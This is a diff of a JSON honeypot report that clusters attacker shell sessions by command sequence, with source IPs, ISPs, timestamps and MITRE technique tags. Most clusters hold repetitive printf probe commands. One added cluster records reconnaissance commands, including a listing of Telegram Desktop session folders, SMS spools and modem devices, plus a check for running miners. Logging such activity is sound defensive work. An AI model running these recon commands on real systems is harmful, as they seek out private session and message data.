+        "printf '\\n%s|%s\\n' 'check_e2892a4289f994fd152ab791daafc5db_small_math' \")\"",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_e2892a4289f994fd152ab791daafc5db_small_pid'\"'\"' \"$$\"'",
+        "printf '\\n%s|%s\\n' 'check_e2892a4289f994fd152ab791daafc5db_small_pid' \"$$\"",
+        "sh -c 'set -- '\"'\"'check_e2892a4289f994fd152ab791daafc5db_arg1'\"'\"' '\"'\"'check_e2892a4289f994fd152ab791daafc5db_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_e2892a4289f994fd152ab791daafc5db_small_positional'\"'\"' \"$#|$1|$2\"'",
+        "set -- 'check_e2892a4289f994fd152ab791daafc5db_arg1' 'check_e2892a4289f994fd152ab791daafc5db_arg2'; printf '\\n%s|%s\\n' 'check_e2892a4289f994fd152ab791daafc5db_small_positional' \"$#|$1|$2\"",
+        "sh -c 'f_check_e2892a4289f994fd152ab791daafc5db() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_e2892a4289f994fd152ab791daafc5db_small_function'\"'\"' \"$1|$#\"; }; f_check_e2892a4289f994fd152ab791daafc5db '\"'\"'check_e2892a4289f994fd152ab791daafc5db_function_value'\"'\"''"
       ],
       "members": [
         {
-          "session_id": "IR-b85b90d99e55",
-          "src_ip": "92.118.39.14",
+          "session_id": "IR-21cf7aecc69a",
+          "src_ip": "92.118.39.64",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 42,
-          "timestamp": "2026-11-17T17:56:49.600454Z"
+          "timestamp": "2026-11-18T03:05:32.391725Z"
         }
       ]
     },
@@ -526,31 +537,31 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "92.118.39.14"
+        "92.118.39.64"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "824224b49df15a10",
+      "sequence_hash": "afd4159d43d05943",
       "ttps": [],
       "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_ef3cfbefa858667f6ac3ea204a284981_small_control'\"'\"' '\"'\"'check_ef3cfbefa858667f6ac3ea204a284981'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_ef3cfbefa858667f6ac3ea204a284981_small_control' 'check_ef3cfbefa858667f6ac3ea204a284981'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_ef3cfbefa858667f6ac3ea204a284981_small_math'\"'\"' \"$((428*81+38))\"'",
-        "(428*81+38",
-        "printf '\\n%s|%s\\n' 'check_ef3cfbefa858667f6ac3ea204a284981_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_ef3cfbefa858667f6ac3ea204a284981_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_ef3cfbefa858667f6ac3ea204a284981_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_ef3cfbefa858667f6ac3ea204a284981_arg1'\"'\"' '\"'\"'check_ef3cfbefa858667f6ac3ea204a284981_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_ef3cfbefa858667f6ac3ea204a284981_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_ef3cfbefa858667f6ac3ea204a284981_arg1' 'check_ef3cfbefa858667f6ac3ea204a284981_arg2'; printf '\\n%s|%s\\n' 'check_ef3cfbefa858667f6ac3ea204a284981_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_ef3cfbefa858667f6ac3ea204a284981() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_ef3cfbefa858667f6ac3ea204a284981_small_function'\"'\"' \"$1|$#\"; }; f_check_ef3cfbefa858667f6ac3ea204a284981 '\"'\"'check_ef3cfbefa858667f6ac3ea204a284981_function_value'\"'\"''"
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_ba7841185af0cc37d1ceb1e10ce34d33_small_control'\"'\"' '\"'\"'check_ba7841185af0cc37d1ceb1e10ce34d33'\"'\"''",
+        "printf '\\n%s|%s\\n' 'check_ba7841185af0cc37d1ceb1e10ce34d33_small_control' 'check_ba7841185af0cc37d1ceb1e10ce34d33'",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_ba7841185af0cc37d1ceb1e10ce34d33_small_math'\"'\"' \"$((878*809+13))\"'",
+        "(878*809+13",
+        "printf '\\n%s|%s\\n' 'check_ba7841185af0cc37d1ceb1e10ce34d33_small_math' \")\"",
+        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_ba7841185af0cc37d1ceb1e10ce34d33_small_pid'\"'\"' \"$$\"'",
+        "printf '\\n%s|%s\\n' 'check_ba7841185af0cc37d1ceb1e10ce34d33_small_pid' \"$$\"",
+        "sh -c 'set -- '\"'\"'check_ba7841185af0cc37d1ceb1e10ce34d33_arg1'\"'\"' '\"'\"'check_ba7841185af0cc37d1ceb1e10ce34d33_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_ba7841185af0cc37d1ceb1e10ce34d33_small_positional'\"'\"' \"$#|$1|$2\"'",
+        "set -- 'check_ba7841185af0cc37d1ceb1e10ce34d33_arg1' 'check_ba7841185af0cc37d1ceb1e10ce34d33_arg2'; printf '\\n%s|%s\\n' 'check_ba7841185af0cc37d1ceb1e10ce34d33_small_positional' \"$#|$1|$2\"",
+        "sh -c 'f_check_ba7841185af0cc37d1ceb1e10ce34d33() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_ba7841185af0cc37d1ceb1e10ce34d33_small_function'\"'\"' \"$1|$#\"; }; f_check_ba7841185af0cc37d1ceb1e10ce34d33 '\"'\"'check_ba7841185af0cc37d1ceb1e10ce34d33_function_value'\"'\"''"
       ],
       "members": [
         {
-          "session_id": "IR-56165d4fb0fa",
-          "src_ip": "92.118.39.14",
+          "session_id": "IR-9c8fb03095bc",
+          "src_ip": "92.118.39.64",
           "country": "RO",
           "isp": "DMZHOST",
           "command_count": 42,
-          "timestamp": "2026-11-17T17:58:55.248416Z"
+          "timestamp": "2026-11-18T03:23:41.834534Z"
         }
       ]
     },
@@ -563,1072 +574,48 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "92.118.39.14"
+        "31.97.242.230"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "3e4e694d20f5e10a",
-      "ttps": [],
+      "sequence_hash": "c74cbeb6eac6dc54",
+      "ttps": [
+        {
+          "id": "T1083",
+          "name": "File & Directory Discovery"
+        },
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1592",
+          "name": "Gather Victim Host Info"
+        }
+      ],
       "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6e39ad2955666b98ac4d47f9df186095_small_control'\"'\"' '\"'\"'check_6e39ad2955666b98ac4d47f9df186095'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_6e39ad2955666b98ac4d47f9df186095_small_control' 'check_6e39ad2955666b98ac4d47f9df186095'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6e39ad2955666b98ac4d47f9df186095_small_math'\"'\"' \"$((302*726+88))\"'",
-        "(302*726+88",
-        "printf '\\n%s|%s\\n' 'check_6e39ad2955666b98ac4d47f9df186095_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6e39ad2955666b98ac4d47f9df186095_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_6e39ad2955666b98ac4d47f9df186095_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_6e39ad2955666b98ac4d47f9df186095_arg1'\"'\"' '\"'\"'check_6e39ad2955666b98ac4d47f9df186095_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6e39ad2955666b98ac4d47f9df186095_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_6e39ad2955666b98ac4d47f9df186095_arg1' 'check_6e39ad2955666b98ac4d47f9df186095_arg2'; printf '\\n%s|%s\\n' 'check_6e39ad2955666b98ac4d47f9df186095_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_6e39ad2955666b98ac4d47f9df186095() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6e39ad2955666b98ac4d47f9df186095_small_function'\"'\"' \"$1|$#\"; }; f_check_6e39ad2955666b98ac4d47f9df186095 '\"'\"'check_6e39ad2955666b98ac4d47f9df186095_function_value'\"'\"''"
+        "/ip cloud print",
+        "ifconfig",
+        "uname -a",
+        "cat /proc/cpuinfo",
+        "ps | grep '[Mm]iner'",
+        "ps -ef | grep '[Mm]iner'",
+        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*",
+        "locate D877F783D5D3EF8Cs",
+        "echo Hi | cat -n"
       ],
       "members": [
         {
-          "session_id": "IR-7d56900bd034",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:00:57.755286Z"
+          "session_id": "IR-03cafd23782c",
+          "src_ip": "31.97.242.230",
+          "country": "BR",
+          "isp": "Hostinger Operations UAB",
+          "command_count": 9,
+          "timestamp": "2026-11-18T04:47:59.940702Z"
         }
       ]
     },
     {
       "cluster_id": "CLU-016",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "53c520b6d63c6ed0",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_65cf248c1b9ce81ef436414d8c594a2d_small_control'\"'\"' '\"'\"'check_65cf248c1b9ce81ef436414d8c594a2d'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_65cf248c1b9ce81ef436414d8c594a2d_small_control' 'check_65cf248c1b9ce81ef436414d8c594a2d'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_65cf248c1b9ce81ef436414d8c594a2d_small_math'\"'\"' \"$((142*438+68))\"'",
-        "(142*438+68",
-        "printf '\\n%s|%s\\n' 'check_65cf248c1b9ce81ef436414d8c594a2d_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_65cf248c1b9ce81ef436414d8c594a2d_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_65cf248c1b9ce81ef436414d8c594a2d_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_65cf248c1b9ce81ef436414d8c594a2d_arg1'\"'\"' '\"'\"'check_65cf248c1b9ce81ef436414d8c594a2d_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_65cf248c1b9ce81ef436414d8c594a2d_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_65cf248c1b9ce81ef436414d8c594a2d_arg1' 'check_65cf248c1b9ce81ef436414d8c594a2d_arg2'; printf '\\n%s|%s\\n' 'check_65cf248c1b9ce81ef436414d8c594a2d_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_65cf248c1b9ce81ef436414d8c594a2d() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_65cf248c1b9ce81ef436414d8c594a2d_small_function'\"'\"' \"$1|$#\"; }; f_check_65cf248c1b9ce81ef436414d8c594a2d '\"'\"'check_65cf248c1b9ce81ef436414d8c594a2d_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-51aa0696cec5",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:03:02.016680Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-017",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "2550adccd4b43239",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f97618f09f67096cb1c3b1b70b65bbea_small_control'\"'\"' '\"'\"'check_f97618f09f67096cb1c3b1b70b65bbea'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_f97618f09f67096cb1c3b1b70b65bbea_small_control' 'check_f97618f09f67096cb1c3b1b70b65bbea'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f97618f09f67096cb1c3b1b70b65bbea_small_math'\"'\"' \"$((55*439+37))\"'",
-        "(55*439+37",
-        "printf '\\n%s|%s\\n' 'check_f97618f09f67096cb1c3b1b70b65bbea_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f97618f09f67096cb1c3b1b70b65bbea_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_f97618f09f67096cb1c3b1b70b65bbea_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_f97618f09f67096cb1c3b1b70b65bbea_arg1'\"'\"' '\"'\"'check_f97618f09f67096cb1c3b1b70b65bbea_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f97618f09f67096cb1c3b1b70b65bbea_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_f97618f09f67096cb1c3b1b70b65bbea_arg1' 'check_f97618f09f67096cb1c3b1b70b65bbea_arg2'; printf '\\n%s|%s\\n' 'check_f97618f09f67096cb1c3b1b70b65bbea_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_f97618f09f67096cb1c3b1b70b65bbea() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f97618f09f67096cb1c3b1b70b65bbea_small_function'\"'\"' \"$1|$#\"; }; f_check_f97618f09f67096cb1c3b1b70b65bbea '\"'\"'check_f97618f09f67096cb1c3b1b70b65bbea_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-a24bd78d28c6",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:07:04.698044Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-018",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "f7d3811a607dd25a",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_189f9d4ec3edcca0647932d44b589e76_small_control'\"'\"' '\"'\"'check_189f9d4ec3edcca0647932d44b589e76'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_189f9d4ec3edcca0647932d44b589e76_small_control' 'check_189f9d4ec3edcca0647932d44b589e76'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_189f9d4ec3edcca0647932d44b589e76_small_math'\"'\"' \"$((322*631+96))\"'",
-        "(322*631+96",
-        "printf '\\n%s|%s\\n' 'check_189f9d4ec3edcca0647932d44b589e76_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_189f9d4ec3edcca0647932d44b589e76_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_189f9d4ec3edcca0647932d44b589e76_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_189f9d4ec3edcca0647932d44b589e76_arg1'\"'\"' '\"'\"'check_189f9d4ec3edcca0647932d44b589e76_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_189f9d4ec3edcca0647932d44b589e76_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_189f9d4ec3edcca0647932d44b589e76_arg1' 'check_189f9d4ec3edcca0647932d44b589e76_arg2'; printf '\\n%s|%s\\n' 'check_189f9d4ec3edcca0647932d44b589e76_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_189f9d4ec3edcca0647932d44b589e76() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_189f9d4ec3edcca0647932d44b589e76_small_function'\"'\"' \"$1|$#\"; }; f_check_189f9d4ec3edcca0647932d44b589e76 '\"'\"'check_189f9d4ec3edcca0647932d44b589e76_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-89c4892924e4",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:09:07.792298Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-019",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "c3a68889a1448ad6",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_a9e0324478a2d9781dde358d07ebfc8d_small_control'\"'\"' '\"'\"'check_a9e0324478a2d9781dde358d07ebfc8d'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_a9e0324478a2d9781dde358d07ebfc8d_small_control' 'check_a9e0324478a2d9781dde358d07ebfc8d'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_a9e0324478a2d9781dde358d07ebfc8d_small_math'\"'\"' \"$((618*977+33))\"'",
-        "(618*977+33",
-        "printf '\\n%s|%s\\n' 'check_a9e0324478a2d9781dde358d07ebfc8d_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_a9e0324478a2d9781dde358d07ebfc8d_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_a9e0324478a2d9781dde358d07ebfc8d_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_a9e0324478a2d9781dde358d07ebfc8d_arg1'\"'\"' '\"'\"'check_a9e0324478a2d9781dde358d07ebfc8d_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_a9e0324478a2d9781dde358d07ebfc8d_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_a9e0324478a2d9781dde358d07ebfc8d_arg1' 'check_a9e0324478a2d9781dde358d07ebfc8d_arg2'; printf '\\n%s|%s\\n' 'check_a9e0324478a2d9781dde358d07ebfc8d_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_a9e0324478a2d9781dde358d07ebfc8d() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_a9e0324478a2d9781dde358d07ebfc8d_small_function'\"'\"' \"$1|$#\"; }; f_check_a9e0324478a2d9781dde358d07ebfc8d '\"'\"'check_a9e0324478a2d9781dde358d07ebfc8d_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-e9b629488e56",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:11:14.344518Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-020",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "64ef53c7ffc41db5",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_04a26a901025a85332671924926c2f96_small_control'\"'\"' '\"'\"'check_04a26a901025a85332671924926c2f96'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_04a26a901025a85332671924926c2f96_small_control' 'check_04a26a901025a85332671924926c2f96'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_04a26a901025a85332671924926c2f96_small_math'\"'\"' \"$((190*524+23))\"'",
-        "(190*524+23",
-        "printf '\\n%s|%s\\n' 'check_04a26a901025a85332671924926c2f96_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_04a26a901025a85332671924926c2f96_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_04a26a901025a85332671924926c2f96_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_04a26a901025a85332671924926c2f96_arg1'\"'\"' '\"'\"'check_04a26a901025a85332671924926c2f96_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_04a26a901025a85332671924926c2f96_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_04a26a901025a85332671924926c2f96_arg1' 'check_04a26a901025a85332671924926c2f96_arg2'; printf '\\n%s|%s\\n' 'check_04a26a901025a85332671924926c2f96_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_04a26a901025a85332671924926c2f96() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_04a26a901025a85332671924926c2f96_small_function'\"'\"' \"$1|$#\"; }; f_check_04a26a901025a85332671924926c2f96 '\"'\"'check_04a26a901025a85332671924926c2f96_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-f02121329097",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:13:18.056520Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-021",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "a591b8a7013abb71",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_5d3380e44e609cf2f251fc9ca5e6583f_small_control'\"'\"' '\"'\"'check_5d3380e44e609cf2f251fc9ca5e6583f'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_5d3380e44e609cf2f251fc9ca5e6583f_small_control' 'check_5d3380e44e609cf2f251fc9ca5e6583f'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_5d3380e44e609cf2f251fc9ca5e6583f_small_math'\"'\"' \"$((929*294+95))\"'",
-        "(929*294+95",
-        "printf '\\n%s|%s\\n' 'check_5d3380e44e609cf2f251fc9ca5e6583f_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_5d3380e44e609cf2f251fc9ca5e6583f_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_5d3380e44e609cf2f251fc9ca5e6583f_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_5d3380e44e609cf2f251fc9ca5e6583f_arg1'\"'\"' '\"'\"'check_5d3380e44e609cf2f251fc9ca5e6583f_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_5d3380e44e609cf2f251fc9ca5e6583f_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_5d3380e44e609cf2f251fc9ca5e6583f_arg1' 'check_5d3380e44e609cf2f251fc9ca5e6583f_arg2'; printf '\\n%s|%s\\n' 'check_5d3380e44e609cf2f251fc9ca5e6583f_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_5d3380e44e609cf2f251fc9ca5e6583f() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_5d3380e44e609cf2f251fc9ca5e6583f_small_function'\"'\"' \"$1|$#\"; }; f_check_5d3380e44e609cf2f251fc9ca5e6583f '\"'\"'check_5d3380e44e609cf2f251fc9ca5e6583f_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-88d2f0632143",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:15:20.797498Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-022",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "b7e171f5bf4c54dc",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_3abc25506a40d98c80fd6172ccd03970_small_control'\"'\"' '\"'\"'check_3abc25506a40d98c80fd6172ccd03970'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_3abc25506a40d98c80fd6172ccd03970_small_control' 'check_3abc25506a40d98c80fd6172ccd03970'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_3abc25506a40d98c80fd6172ccd03970_small_math'\"'\"' \"$((82*634+2))\"'",
-        "(82*634+2",
-        "printf '\\n%s|%s\\n' 'check_3abc25506a40d98c80fd6172ccd03970_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_3abc25506a40d98c80fd6172ccd03970_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_3abc25506a40d98c80fd6172ccd03970_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_3abc25506a40d98c80fd6172ccd03970_arg1'\"'\"' '\"'\"'check_3abc25506a40d98c80fd6172ccd03970_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_3abc25506a40d98c80fd6172ccd03970_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_3abc25506a40d98c80fd6172ccd03970_arg1' 'check_3abc25506a40d98c80fd6172ccd03970_arg2'; printf '\\n%s|%s\\n' 'check_3abc25506a40d98c80fd6172ccd03970_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_3abc25506a40d98c80fd6172ccd03970() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_3abc25506a40d98c80fd6172ccd03970_small_function'\"'\"' \"$1|$#\"; }; f_check_3abc25506a40d98c80fd6172ccd03970 '\"'\"'check_3abc25506a40d98c80fd6172ccd03970_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-d0480c40db70",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:17:25.660955Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-023",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "c8da76913ecd8093",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_95998f4b556d7662af1b4d557eee6770_small_control'\"'\"' '\"'\"'check_95998f4b556d7662af1b4d557eee6770'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_95998f4b556d7662af1b4d557eee6770_small_control' 'check_95998f4b556d7662af1b4d557eee6770'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_95998f4b556d7662af1b4d557eee6770_small_math'\"'\"' \"$((412*17+80))\"'",
-        "(412*17+80",
-        "printf '\\n%s|%s\\n' 'check_95998f4b556d7662af1b4d557eee6770_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_95998f4b556d7662af1b4d557eee6770_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_95998f4b556d7662af1b4d557eee6770_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_95998f4b556d7662af1b4d557eee6770_arg1'\"'\"' '\"'\"'check_95998f4b556d7662af1b4d557eee6770_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_95998f4b556d7662af1b4d557eee6770_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_95998f4b556d7662af1b4d557eee6770_arg1' 'check_95998f4b556d7662af1b4d557eee6770_arg2'; printf '\\n%s|%s\\n' 'check_95998f4b556d7662af1b4d557eee6770_small_positional' \"$#|$1|$2\"",
